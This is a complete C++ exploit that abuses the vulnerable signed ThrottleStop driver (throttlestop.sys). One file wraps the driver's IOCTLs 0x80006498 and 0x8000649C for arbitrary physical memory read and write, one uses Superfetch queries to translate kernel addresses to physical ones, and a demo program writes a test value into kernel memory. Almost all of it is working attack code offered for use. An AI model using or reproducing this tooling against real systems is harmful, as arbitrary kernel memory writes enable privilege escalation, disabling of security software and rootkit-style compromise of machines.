The exploit (entry.cpp) uses the vulnerability in throttlestop.sys signed driver to run a test. Please check individual source codes below:



entry.cpp:-
#include "driver/driver.h"
#include "superfetch/superfetch.h"
#include <iostream>
#pragma comment(lib, "ntdll.lib")


int main()
{
    MemoryDriver Driver;

    if (!Driver.Initialize())
    {
        std::wcout << L"failed to init driver\n";
        Sleep(2000);
        return 1;
    }

    if (!Driver.SetTargetProcess(L"notepad.exe"))
    {
        std::wcout << L"cant find notepad\n";
        Sleep(2000);
        return 1;
    }

    std::wcout << L"target pid: " << Driver.GetTargetProcessId() << L"\n";

    auto mm = spf::memory_map::current();
    if (!mm)
    {
        std::wcout << L"memory map failed\n";
        Sleep(2000);
        return 1;
    }

    // translate virtual to physical
    void* virt_addr = reinterpret_cast<void*>(0xFFFFF80000001000);
    std::uint64_t phys_addr = mm->translate(virt_addr);

    if (phys_addr)
    {
        std::wcout << L"virtual: 0x" << std::hex << reinterpret_cast<std::uintptr_t>(virt_addr) << L"\n";
        std::wcout << L"physical: 0x" << phys_addr << L"\n";

        // read from physical memory
        ULONG64 val = Driver.ReadPhysical<ULONG64>(phys_addr);
        std::wcout << L"read: 0x" << val << L"\n";

        // write test
        ULONG64 orig = val;
        if (Driver.WritePhysical<ULONG64>(phys_addr, 0x1337))
        {
            ULONG64 new_val = Driver.ReadPhysical<ULONG64>(phys_addr);
            std::wcout << L"wrote: 0x" << new_val << L"\n";

            // restore
            Driver.WritePhysical<ULONG64>(phys_addr, orig);
        }
    }

    // test a few more addresses
    ULONG64 test_addrs[] = { 0x1000, 0x2000, 0x10000 };
    for (auto addr : test_addrs)
    {
        ULONG64 value = Driver.ReadPhysical<ULONG64>(addr);
        std::wcout << L"0x" << std::hex << addr << L": 0x" << value << L"\n";
    }

    std::wcout << L"done\n";
    Sleep(2000);
    return 0;
}




superfetch.h (source code):-
#pragma once

#include "nt.h"

#include <vector>
#include <unordered_map>
#include <expected>
#include <memory>

namespace spf {

    struct memory_range {
        std::uint64_t pfn = 0;
        std::size_t page_count = 0;
    };

    enum class spf_error {
        raise_privilege,
        query_ranges,
        query_pfn
    };

    using memory_ranges = std::vector<memory_range>;
    using memory_translations = std::unordered_map<void const*, std::uint64_t>;

    class memory_map {
    public:
        // Create a snapshot of the current system memory map.
        static std::expected<memory_map, spf_error> current();

        // Translate a virtual address to a physical address.
        std::uint64_t translate(void const* address) const;

        // Get a vector of physical memory ranges.
        memory_ranges const& ranges() const;

        // Get a map of virtual to physical page translations.
        memory_translations const& translations() const;

    private:
        static bool raise_privilege();

        static memory_ranges query_memory_ranges();
        static memory_ranges query_memory_ranges_v1();
        static memory_ranges query_memory_ranges_v2();

        static NTSTATUS query_superfetch_info(
            SUPERFETCH_INFORMATION_CLASS info_class,
            PVOID                        buffer,
            ULONG                        length,
            PULONG                       return_length = nullptr
        );

    private:
        // Contiguous physical memory ranges.
        memory_ranges ranges_ = {};

        // Virtual to physical page translations.
        memory_translations translations_ = {};
    };

    // Take a snapshot of the current system memory map.
    inline std::expected<memory_map, spf_error> memory_map::current() {
        if (!raise_privilege())
            return std::unexpected(spf_error::raise_privilege);

        memory_map mm = {};
        mm.ranges_ = query_memory_ranges();

        if (mm.ranges_.empty())
            return std::unexpected(spf_error::query_ranges);

        for (auto const& [base_pfn, page_count] : mm.ranges_) {
            // This is a bit too big, but its not a big deal.
            std::size_t const buffer_length = sizeof(PF_PFN_PRIO_REQUEST) +
                sizeof(MMPFN_IDENTITY) * page_count;

            auto const buffer = std::make_unique<std::uint8_t[]>(buffer_length);
            auto const request = reinterpret_cast<PF_PFN_PRIO_REQUEST*>(buffer.get());
            request->Version = 1;
            request->RequestFlags = 1;
            request->PfnCount = page_count;

            for (std::uint64_t i = 0; i < page_count; ++i)
                request->PageData[i].PageFrameIndex = base_pfn + i;

            if (!NT_SUCCESS(query_superfetch_info(
                SuperfetchPfnQuery, request, buffer_length)))
                return std::unexpected(spf_error::query_pfn);

            for (std::uint64_t i = 0; i < page_count; ++i) {
                // Cache the translation for this page.
                if (void const* const virt = request->PageData[i].u2.VirtualAddress)
                    mm.translations_[virt] = (base_pfn + i) << 12;
            }
        }

        return mm;
    }

    // Translate a virtual address to a physical address.
    inline std::uint64_t memory_map::translate(void const* const address) const {
        // Align to the lowest page boundary.
        void const* const aligned = reinterpret_cast<void const*>(
            reinterpret_cast<std::uint64_t>(address) & ~0xFFFull);

        auto const it = translations_.find(aligned);
        if (it == end(translations_))
            return 0;

        return it->second + (reinterpret_cast<std::uint64_t>(address) & 0xFFF);
    }

    // Get a vector of physical memory ranges.
    inline memory_ranges const& memory_map::ranges() const {
        return ranges_;
    }

    // Get a map of virtual to physical page translations.
    inline memory_translations const& memory_map::translations() const {
        return translations_;
    }

    inline bool memory_map::raise_privilege() {
        BOOLEAN old = FALSE;

        if (!NT_SUCCESS(RtlAdjustPrivilege(
            SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &old)))
            return false;

        if (!NT_SUCCESS(RtlAdjustPrivilege(
            SE_DEBUG_PRIVILEGE, TRUE, FALSE, &old)))
            return false;

        return true;
    }

    inline memory_ranges memory_map::query_memory_ranges() {
        auto ranges = query_memory_ranges_v1();
        if (ranges.empty())
            return query_memory_ranges_v2();
        return ranges;
    }

    inline memory_ranges memory_map::query_memory_ranges_v1() {
        ULONG buffer_length = 0;

        // STATUS_BUFFER_TOO_SMALL.
        if (PF_MEMORY_RANGE_INFO_V1 info = {}; 0xC0000023 != query_superfetch_info(
            SuperfetchMemoryRangesQuery, &info, sizeof(info), &buffer_length))
            return {};

        auto const buffer = std::make_unique<std::uint8_t[]>(buffer_length);
        auto const info = reinterpret_cast<PF_MEMORY_RANGE_INFO_V1*>(buffer.get());
        info->Version = 1;

        if (!NT_SUCCESS(query_superfetch_info(
            SuperfetchMemoryRangesQuery, info, buffer_length)))
            return {};

        memory_ranges ranges = {};

        for (std::uint32_t i = 0; i < info->RangeCount; ++i) {
            ranges.push_back({
              .pfn = info->Ranges[i].BasePfn,
              .page_count = info->Ranges[i].PageCount
                });
        }

        return ranges;
    }

    inline memory_ranges memory_map::query_memory_ranges_v2() {
        ULONG buffer_length = 0;

        // STATUS_BUFFER_TOO_SMALL.
        if (PF_MEMORY_RANGE_INFO_V2 info = {}; 0xC0000023 != query_superfetch_info(
            SuperfetchMemoryRangesQuery, &info, sizeof(info), &buffer_length))
            return {};

        auto const buffer = std::make_unique<std::uint8_t[]>(buffer_length);
        auto const info = reinterpret_cast<PF_MEMORY_RANGE_INFO_V2*>(buffer.get());
        info->Version = 2;

        if (!NT_SUCCESS(query_superfetch_info(
            SuperfetchMemoryRangesQuery, info, buffer_length)))
            return {};

        memory_ranges ranges = {};

        for (std::uint32_t i = 0; i < info->RangeCount; ++i) {
            ranges.push_back({
              .pfn = info->Ranges[i].BasePfn,
              .page_count = info->Ranges[i].PageCount
                });
        }

        return ranges;
    }

    inline NTSTATUS memory_map::query_superfetch_info(
        SUPERFETCH_INFORMATION_CLASS info_class,
        PVOID                        buffer,
        ULONG                        length,
        PULONG                       return_length
    ) {
        SUPERFETCH_INFORMATION superfetch_info = {
          .InfoClass = info_class,
          .Data = buffer,
          .Length = length
        };

        return NtQuerySystemInformation(SystemSuperfetchInformation,
            &superfetch_info, sizeof(superfetch_info), return_length);
    }

} 




nt.h (source code):-
#pragma once

#include <Windows.h>
#include <winternl.h>

namespace spf {

    enum SUPERFETCH_INFORMATION_CLASS {
        SuperfetchRetrieveTrace = 1,  // Query
        SuperfetchSystemParameters = 2,  // Query
        SuperfetchLogEvent = 3,  // Set
        SuperfetchGenerateTrace = 4,  // Set
        SuperfetchPrefetch = 5,  // Set
        SuperfetchPfnQuery = 6,  // Query
        SuperfetchPfnSetPriority = 7,  // Set
        SuperfetchPrivSourceQuery = 8,  // Query
        SuperfetchSequenceNumberQuery = 9,  // Query
        SuperfetchScenarioPhase = 10, // Set
        SuperfetchWorkerPriority = 11, // Set
        SuperfetchScenarioQuery = 12, // Query
        SuperfetchScenarioPrefetch = 13, // Set
        SuperfetchRobustnessControl = 14, // Set
        SuperfetchTimeControl = 15, // Set
        SuperfetchMemoryListQuery = 16, // Query
        SuperfetchMemoryRangesQuery = 17, // Query
        SuperfetchTracingControl = 18, // Set
        SuperfetchTrimWhileAgingControl = 19,
        SuperfetchInformationMax = 20
    };

    struct SUPERFETCH_INFORMATION {
        ULONG                        Version = 45;
        ULONG                        Magic = 'kuhC';
        SUPERFETCH_INFORMATION_CLASS InfoClass;
        PVOID                        Data;
        ULONG                        Length;
    };

    struct MEMORY_FRAME_INFORMATION {
        ULONGLONG UseDescription : 4;
        ULONGLONG ListDescription : 3;
        ULONGLONG Reserved0 : 1;
        ULONGLONG Pinned : 1;
        ULONGLONG DontUse : 48;
        ULONGLONG Priority : 3;
        ULONGLONG Reserved : 4;
    };

    struct FILEOFFSET_INFORMATION {
        ULONGLONG DontUse : 9;
        ULONGLONG Offset : 48;
        ULONGLONG Reserved : 7;
    };

    struct PAGEDIR_INFORMATION {
        ULONGLONG DontUse : 9;
        ULONGLONG PageDirectoryBase : 48;
        ULONGLONG Reserved : 7;
    };

    struct UNIQUE_PROCESS_INFORMATION {
        ULONGLONG DontUse : 9;
        ULONGLONG UniqueProcessKey : 48;
        ULONGLONG Reserved : 7;
    };

    struct MMPFN_IDENTITY {
        union {
            MEMORY_FRAME_INFORMATION   e1;
            FILEOFFSET_INFORMATION     e2;
            PAGEDIR_INFORMATION        e3;
            UNIQUE_PROCESS_INFORMATION e4;
        } u1;
        SIZE_T PageFrameIndex;
        union {
            struct {
                ULONG Image : 1;
                ULONG Mismatch : 1;
            } e1;
            PVOID FileObject;
            PVOID UniqueFileObjectKey;
            PVOID ProtoPteAddress;
            PVOID VirtualAddress;
        } u2;
    };

    struct SYSTEM_MEMORY_LIST_INFORMATION {
        SIZE_T    ZeroPageCount;
        SIZE_T    FreePageCount;
        SIZE_T    ModifiedPageCount;
        SIZE_T    ModifiedNoWritePageCount;
        SIZE_T    BadPageCount;
        SIZE_T    PageCountByPriority[8];
        SIZE_T    RepurposedPagesByPriority[8];
        ULONG_PTR ModifiedPageCountPageFile;
    };

    struct PF_PFN_PRIO_REQUEST {
        ULONG                          Version;
        ULONG                          RequestFlags;
        SIZE_T                         PfnCount;
        SYSTEM_MEMORY_LIST_INFORMATION MemInfo;
        MMPFN_IDENTITY                 PageData[ANYSIZE_ARRAY];
    };

    struct PF_PHYSICAL_MEMORY_RANGE {
        ULONG_PTR BasePfn;
        ULONG_PTR PageCount;
    };

    struct PF_MEMORY_RANGE_INFO_V1 {
        ULONG Version = 1;
        ULONG RangeCount;
        PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
    };

    struct PF_MEMORY_RANGE_INFO_V2 {
        ULONG Version = 2;
        ULONG Flags;
        ULONG RangeCount;
        PF_PHYSICAL_MEMORY_RANGE Ranges[ANYSIZE_ARRAY];
    };

    inline constexpr ULONG SE_PROF_SINGLE_PROCESS_PRIVILEGE = 13;
    inline constexpr ULONG SE_DEBUG_PRIVILEGE = 20;

    inline constexpr SYSTEM_INFORMATION_CLASS SystemSuperfetchInformation = SYSTEM_INFORMATION_CLASS(79);

    extern "C" NTSYSAPI NTSTATUS RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

} // namespace spf



driver.h (source code):-
#pragma once
#include <windows.h>
#include <winioctl.h>
#include <cstdio>  
#include <cwchar>   
#include <vector>
#include <tlhelp32.h>
#include <string>

#pragma pack(push, 1)
struct WriteRequest
{
    ULONG64 PhysicalAddress;
    UCHAR Data[8];
};
#pragma pack(pop)

class MemoryDriver
{
private:
    HANDLE DriverHandle;
    DWORD TargetProcessId;

    bool InitializeDriver()
    {
        DriverHandle = CreateFileW(L"\\\\.\\ThrottleStop",
            GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, NULL);
        return DriverHandle != INVALID_HANDLE_VALUE;
    }

    DWORD GetProcessIdByName(const wchar_t* ProcessName)
    {
        HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (Snapshot == INVALID_HANDLE_VALUE)
        {
            wprintf(L"\n [ - ] Failed To Create Process Snapshot\n");
            return 0;
        }

        PROCESSENTRY32W Entry;
        Entry.dwSize = sizeof(Entry);

        if (Process32FirstW(Snapshot, &Entry))
        {
            do
            {
                if (_wcsicmp(Entry.szExeFile, ProcessName) == 0)
                {
                    CloseHandle(Snapshot);
                    wprintf(L"\n [ + ] Found Process: %s (PID: %lu)\n", Entry.szExeFile, Entry.th32ProcessID);
                    return Entry.th32ProcessID;
                }
            } while (Process32NextW(Snapshot, &Entry));
        }

        CloseHandle(Snapshot);
        wprintf(L"\n [ - ] Process Not Found: %s\n", ProcessName);
        return 0;
    }

    std::vector<std::wstring> GetRunningProcesses()
    {
        std::vector<std::wstring> Processes;
        HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Snapshot != INVALID_HANDLE_VALUE)
        {
            PROCESSENTRY32W Entry;
            Entry.dwSize = sizeof(Entry);

            if (Process32FirstW(Snapshot, &Entry))
            {
                do
                {
                    Processes.push_back(Entry.szExeFile);
                } while (Process32NextW(Snapshot, &Entry));
            }
            CloseHandle(Snapshot);
        }

        return Processes;
    }

    bool ReadPhysicalMemoryRaw(ULONG64 Address, PVOID Buffer, SIZE_T Size)
    {
        if (Size > 8)
        {
            wprintf(L"\n [ - ] ReadPhysical: Size Too Large: %zu\n", Size);
            return false;
        }

        ULONG64 PhysAddr = Address;
        DWORD BytesReturned = 0;

        bool Result = DeviceIoControl(DriverHandle,
            0x80006498,
            &PhysAddr, sizeof(PhysAddr),
            Buffer, (DWORD)Size,
            &BytesReturned, NULL);

        if (!Result)
        {
            DWORD Error = GetLastError();
            wprintf(L"\n [ - ] ReadPhysical Failed: Address=0x%llX, Size=%zu, Error=%lu\n", Address, Size, Error);
        }

        return Result && BytesReturned == Size;
    }

    bool WritePhysicalMemoryRaw(ULONG64 Address, PVOID Buffer, SIZE_T Size)
    {
        if (Size > 8) return false;

        UCHAR InputBuffer[16] = { 0 };
        *(ULONG64*)InputBuffer = Address;
        memcpy(InputBuffer + 8, Buffer, Size);

        DWORD BytesReturned = 0;

        bool Result = DeviceIoControl(DriverHandle,
            0x8000649C,
            InputBuffer, 8 + (DWORD)Size,
            nullptr, 0,
            &BytesReturned, NULL);

        if (!Result)
        {
            DWORD Error = GetLastError();
            wprintf(L"\n [ - ] WritePhysical Failed: Address=0x%llX, Size=%zu, Error=%lu\n", Address, Size, Error);
        }

        return Result;
    }

    bool TestDriverCommunication()
    {
        wprintf(L"\n [ ? ] Testing Driver Communication...");

        ULONG64 TestAddr = 0x1000;
        UCHAR Buffer[8] = { 0 };
        DWORD BytesReturned = 0;

        bool Result = DeviceIoControl(DriverHandle,
            0x80006498,
            &TestAddr, 8,
            Buffer, 8,
            &BytesReturned, NULL);

        if (Result && BytesReturned == 8)
        {
            wprintf(L"\n [ + ] Driver Communication Working\n");
            return true;
        }

        wprintf(L"\n [ - ] Driver Communication Failed\n");
        return false;
    }

public:
    MemoryDriver() : DriverHandle(INVALID_HANDLE_VALUE), TargetProcessId(0) {}

    ~MemoryDriver()
    {
        if (DriverHandle != INVALID_HANDLE_VALUE)
        {
            CloseHandle(DriverHandle);
        }
    }

    bool Initialize()
    {
        wprintf(L"\n [ ? ] Initializing Memory Driver...");

        if (!InitializeDriver())
        {
            wprintf(L"\n [ - ] Failed To Open Driver Handle\n");
            return false;
        }

        if (!TestDriverCommunication())
        {
            wprintf(L"\n [ - ] Driver Communication Test Failed\n");
            return false;
        }

        wprintf(L"\n [ + ] Memory Driver Initialized Successfully\n");
        return true;
    }

    bool SetTargetProcess(const wchar_t* ProcessName)
    {
        wprintf(L"\n [ ? ] Setting Target Process: %s\n", ProcessName);

        TargetProcessId = GetProcessIdByName(ProcessName);
        if (TargetProcessId == 0)
        {
            return false;
        }

        wprintf(L"\n [ + ] Target Process Set Successfully\n");
        return true;
    }

    bool SetTargetProcess(DWORD ProcessId)
    {
        wprintf(L"\n [ ? ] Setting Target Process By PID: %lu\n", ProcessId);
        TargetProcessId = ProcessId;
        wprintf(L"\n [ + ] Target Process Set Successfully\n");
        return true;
    }

    DWORD GetTargetProcessId() const
    {
        return TargetProcessId;
    }

    template<typename T>
    T ReadPhysical(ULONG64 Address)
    {
        T Value = {};
        ReadPhysicalMemoryRaw(Address, &Value, sizeof(T));
        return Value;
    }

    template<typename T>
    bool WritePhysical(ULONG64 Address, const T& Value)
    {
        return WritePhysicalMemoryRaw(Address, (PVOID)&Value, sizeof(T));
    }

    bool ReadPhysicalBuffer(ULONG64 Address, PVOID Buffer, SIZE_T Size)
    {
        wprintf(L"\n [ ? ] Reading Physical Buffer: Address=0x%llX, Size=%zu\n", Address, Size);

        UCHAR* ByteBuffer = (UCHAR*)Buffer;
        SIZE_T BytesRead = 0;

        while (BytesRead < Size)
        {
            SIZE_T ChunkSize = min(Size - BytesRead, 8);

            if (!ReadPhysicalMemoryRaw(Address + BytesRead,
                ByteBuffer + BytesRead,
                ChunkSize))
            {
                wprintf(L"\n [ - ] Failed To Read Chunk At Offset: %zu\n", BytesRead);
                return false;
            }

            BytesRead += ChunkSize;
        }

        wprintf(L"\n [ + ] Successfully Read Physical Buffer\n");
        return true;
    }

    bool WritePhysicalBuffer(ULONG64 Address, PVOID Buffer, SIZE_T Size)
    {
        wprintf(L"\n [ ? ] Writing Physical Buffer: Address=0x%llX, Size=%zu\n", Address, Size);

        UCHAR* ByteBuffer = (UCHAR*)Buffer;
        SIZE_T BytesWritten = 0;

        while (BytesWritten < Size)
        {
            SIZE_T ChunkSize = min(Size - BytesWritten, 8);

            if (!WritePhysicalMemoryRaw(Address + BytesWritten,
                ByteBuffer + BytesWritten,
                ChunkSize))
            {
                wprintf(L"\n [ - ] Failed To Write Chunk At Offset: %zu\n", BytesWritten);
                return false;
            }

            BytesWritten += ChunkSize;
        }

        wprintf(L"\n [ + ] Successfully Wrote Physical Buffer\n");
        return true;
    }
};
